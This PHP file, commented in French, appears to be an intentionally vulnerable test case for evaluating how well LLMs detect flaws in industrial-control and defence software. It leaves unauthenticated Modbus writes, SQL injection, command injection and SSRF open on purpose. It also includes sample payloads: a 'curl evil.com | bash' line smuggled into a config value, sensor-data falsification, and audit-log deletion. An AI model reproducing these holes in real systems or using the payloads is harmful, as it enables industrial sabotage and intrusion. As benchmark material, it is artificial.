<?php
/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (DOMAINE : DÉFENSE / ICS-SCADA)
 * Usage : évaluation LLM — détection de failles dans systèmes industriels et militaires
 * CVE de référence réels 2024-2026 :
 *   CVE-2025-3699  : Mitsubishi Electric AC system RCE (CVSS 9.8)
 *   CVE-2025-5740  : Schneider Electric EVLink WallBox (RCE)
 *   CVE-2026-32746 : GNU Inetutils telnetd buffer overflow (ICS/OT)
 *   CVE-2021-22681 : Rockwell PLC — exploité par Iran 2026
 *   Volt Typhoon   : 300 jours dans réseau OT d'une utility US (2025)
 * NE PAS déployer en production.
 */

$pdo = new PDO('mysql:host=localhost;dbname=scada', 'root', '');

// ═══════════════════════════════════════════════════════════════════════
// 1. API PLC SANS AUTHENTIFICATION — accès direct aux automates
// OWASP A07:2025 – Authentication Failures | CVSS 10.0
// CVE-2021-22681 pattern — Rockwell PLC exploité par acteurs étatiques
// Impact : manipulation de processus industriels → sabotage, explosion possible
// ═══════════════════════════════════════════════════════════════════════
function writePlcRegister(string $plcIp, int $register, int $value): bool {
    // Protocole Modbus/TCP — aucune authentification native dans Modbus
    // Accessible sur port 502 depuis le réseau
    $socket = fsockopen($plcIp, 502, $errno, $errstr, 5);
    if ($socket) {
        // Requête Modbus Write Single Register
        $request = pack('nnnnCC n', 0x0001, 0x0000, 0x0006, 0x0001, 0x06,
                        $register, $value);
        fwrite($socket, $request);
        fclose($socket);
        return true;
    }
    return false;
}

// Exemple : writePlcRegister('192.168.1.10', 40001, 9999) → température max forcée à 9999°C

// ═══════════════════════════════════════════════════════════════════════
// 2. HMI WEB SANS TLS — credentials Modbus en clair
// OWASP A04:2025 – Cryptographic Failures | CVSS 8.5
// Impact : capture réseau → accès aux automates
// ═══════════════════════════════════════════════════════════════════════
// Interface HMI (Human Machine Interface) accessible en HTTP
// Credentials transmis en clair : POST http://hmi.plant.local/login
$hmi_user = $_POST['username'];
$hmi_pass = $_POST['password'];
$stmt = $pdo->prepare("SELECT * FROM operators WHERE username = ? AND password = ?");
$stmt->execute([$hmi_user, md5($hmi_pass)]); // MD5 + HTTP = triple vulnérabilité

// ═══════════════════════════════════════════════════════════════════════
// 3. INJECTION SQL DANS SCADA HISTORIAN
// OWASP A05:2025 – Injection | CVSS 9.8
// Impact : falsification des données de capteurs → décisions opérationnelles erronées
// ═══════════════════════════════════════════════════════════════════════
$sensor_id = $_GET['sensor'];
$from_date = $_GET['from'];
$to_date   = $_GET['to'];
$data = $pdo->query(
    "SELECT timestamp, value FROM sensor_data
     WHERE sensor_id = '$sensor_id'
     AND timestamp BETWEEN '$from_date' AND '$to_date'"
)->fetchAll();
// Payload sensor_id : "1'; UPDATE sensor_data SET value=0 WHERE sensor_id=PRESSURE_MAIN; --"
// → efface les données de pression → opérateur croit pression normale

// ═══════════════════════════════════════════════════════════════════════
// 4. COMMAND INJECTION VIA FICHIER DE CONFIGURATION ICS
// OWASP A05:2025 – Injection | CVSS 10.0
// Impact : exécution de code sur le serveur SCADA → pivot vers le réseau OT
// ═══════════════════════════════════════════════════════════════════════
function applyNetworkConfig(string $configFile): void {
    // le fichier de config contient des paramètres réseau
    // uploadé par un opérateur → si compromis → RCE
    $config = parse_ini_file($configFile);
    // exécution sans validation
    shell_exec("ip addr add " . $config['ip_address'] . " dev eth0");
    // Payload dans le fichier ini : ip_address = "10.0.0.1/24 && curl evil.com | bash"
}

// ═══════════════════════════════════════════════════════════════════════
// 5. DONNÉES DE CLASSIFICATION SANS CONTRÔLE D'ACCÈS
// OWASP A01:2025 – Broken Access Control | CVSS 9.5
// Impact : accès à des données sensibles de défense par du personnel non habilité
// ═══════════════════════════════════════════════════════════════════════
function getClassifiedReport(int $report_id): array {
    global $pdo;
    // Les rapports ont des niveaux de classification (SECRET, TRÈS SECRET)
    // mais aucune vérification de l'habilitation de l'utilisateur
    $stmt = $pdo->prepare("SELECT * FROM classified_reports WHERE id = ?");
    $stmt->execute([$report_id]);
    return $stmt->fetch();
    // Un utilisateur CONFIDENTIEL peut accéder à des documents TRÈS SECRET
}

// ═══════════════════════════════════════════════════════════════════════
// 6. TÉLÉMÉTRIE DRONE / SATELLITE NON CHIFFRÉE
// OWASP A04:2025 – Cryptographic Failures | CVSS 9.8
// Impact : interception, replay attack, détournement de drone
// CVE pattern : SDR (Software Defined Radio) attack sur protocoles 433MHz/915MHz
// ═══════════════════════════════════════════════════════════════════════
function sendDroneCommand(string $droneId, string $command, float $lat, float $lng): bool {
    // transmission UDP sans chiffrement sur port 14550 (MAVLink protocol)
    // MAVLink v1 n'a pas d'authentification ni de chiffrement par défaut
    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
    $payload = pack('CCCCCCCa4', 0xFE, 0x09, 0x00, 0x01, 0x01, 0x00, 0x00,
                    $command . chr(0));
    socket_sendto($socket, $payload, strlen($payload), 0, $droneId, 14550);
    return true;
    // Un attaquant SDR capte, rejoue ou forge des commandes → détournement
}

// ═══════════════════════════════════════════════════════════════════════
// 7. SYSTÈME D'ARME CONNECTÉ — SSRF VERS RÉSEAU FERMÉ (AIR-GAP)
// OWASP A01:2025 – Broken Access Control (SSRF) | CVSS Critical
// Impact : pivot depuis le réseau exposé vers le réseau de commandement
// ═══════════════════════════════════════════════════════════════════════
function fetchThreatFeed(string $source_url): array {
    // le réseau de commandement est supposément isolé (air-gap)
    // mais ce service est accessible depuis Internet ET le réseau interne
    $data = file_get_contents($source_url);
    // Payload : http://10.0.100.1/command-system/status
    // → SSRF vers le réseau de commandement via le serveur de threat intelligence
    return json_decode($data, true);
}

// ═══════════════════════════════════════════════════════════════════════
// 8. LOG MANIPULATION — falsification des journaux d'audit militaires
// OWASP A09:2025 – Security Logging and Alerting Failures | CVSS 8.5
// Impact : couverture d'une intrusion → incident non détecté
// ═══════════════════════════════════════════════════════════════════════
function logSystemEvent(string $operator, string $action, string $target): void {
    global $pdo;
    // log en base SQL sans WORM storage → peut être modifié ou supprimé
    // opérateur malveillant peut effacer ses traces
    $pdo->exec("INSERT INTO audit_log (operator, action, target, ts)
                VALUES ('$operator', '$action', '$target', NOW())");
    // Un attaquant : DELETE FROM audit_log WHERE operator='attacker' → pas de traces
}
